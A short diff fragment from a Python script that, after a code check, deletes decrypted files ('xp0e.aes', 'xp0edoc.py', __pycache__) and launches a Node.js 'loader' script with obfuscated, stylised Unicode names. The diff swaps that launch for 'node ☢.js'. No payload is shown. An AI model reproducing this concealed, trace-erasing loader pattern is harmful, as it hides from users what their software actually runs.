@@ -166,7 +166,8 @@ if ᴠʟᴋʏʀᴇi is not None:
             os.remove("xp0e.aes")
             os.remove("xp0edoc.py")
             shutil.rmtree("__pycache__")
-            os.system('node ᴠʟᴋʏʀᴇ🕸️ʜᴏꜱᴛᴇʀ/𝕭𝖔𝖔𝖙☢𝕷𝖔𝖆𝖉𝖊𝖗.js')
+            os.system("clear")
+            os.system('node ☢.js')
         else:
             print("❌❌❌     Wrong кгץкภչ code   ❌❌❌")
             os.remove("xp0e.zip")
